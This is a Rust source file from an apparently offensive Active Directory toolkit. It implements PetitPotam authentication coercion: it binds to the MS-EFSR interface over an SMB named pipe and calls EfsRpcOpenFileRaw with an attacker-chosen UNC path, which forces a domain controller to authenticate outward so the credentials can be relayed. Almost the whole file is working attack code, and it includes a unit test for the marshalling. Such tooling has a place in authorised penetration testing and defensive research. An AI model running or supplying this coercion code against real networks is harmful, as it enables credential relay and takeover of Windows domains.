//! MS-EFSR coercion (PetitPotam) — `EfsRpcOpenFileRaw` forces the DC to open an attacker
//! UNC path, triggering outbound NTLM/Kerberos auth (relayable). Rides the SMB named-pipe
//! DCE/RPC transport; the EFSRPC interface is reachable on `\lsarpc` and `\efsrpc`.

use crate::ndr::NdrEncoder;
use crate::transport::SmbPipe;
use crate::{Result, Syntax};
use adhammer_smb::SmbClient;

/// EFSRPC interface (MS-EFSR), v1.0.
pub fn efsr_syntax() -> Syntax {
    Syntax::new("c681d488-d850-11d0-8c52-00c04fd90f7e", 1, 0)
}

pub const OPNUM_OPEN_FILE_RAW: u16 = 0;

/// EfsRpcOpenFileRaw(FileName=[in,string], Flags=[in]) — hContext is [out], not marshaled.
pub fn encode_open_file_raw(unc: &str) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent(); // FileName pointer
    e.conformant_varying_wstr(unc); // NUL-terminated wide string
    e.u32(0); // Flags
    e.into_bytes()
}

pub struct CoerceClient<'a> {
    pipe: SmbPipe<'a>,
}

impl<'a> CoerceClient<'a> {
    pub async fn bind(client: &'a mut SmbClient, file_id: [u8; 16]) -> Result<Self> {
        let mut pipe = SmbPipe::new(client, file_id);
        pipe.bind(efsr_syntax()).await?;
        Ok(CoerceClient { pipe })
    }

    /// Fire EfsRpcOpenFileRaw at `\\listener\share\x`. Returns the EFSRPC status word — a
    /// non-fault response means the DC processed the call (coercion attempted). Full auth
    /// capture requires a relay/listener on the attacker host (out of tool scope).
    pub async fn coerce(&mut self, listener: &str) -> Result<u32> {
        let unc = format!("\\\\{listener}\\share\\adhammer.txt");
        let resp = self.pipe.call(OPNUM_OPEN_FILE_RAW, &encode_open_file_raw(&unc)).await?;
        // EfsRpcOpenFileRaw returns [out] handle (20) + NTSTATUS at the tail.
        let status = resp
            .len()
            .checked_sub(4)
            .and_then(|o| resp.get(o..o + 4))
            .map(|b| u32::from_le_bytes(b.try_into().unwrap()))
            .unwrap_or(0);
        Ok(status)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn open_file_raw_marshals_unc_and_flags() {
        let stub = encode_open_file_raw("\\\\10.0.0.1\\s\\x");
        // referent(4) then string; Flags is the trailing u32 = 0
        assert_ne!(u32::from_le_bytes(stub[0..4].try_into().unwrap()), 0); // referent nonzero
        assert_eq!(&stub[stub.len() - 4..], &[0, 0, 0, 0]); // Flags
    }
}
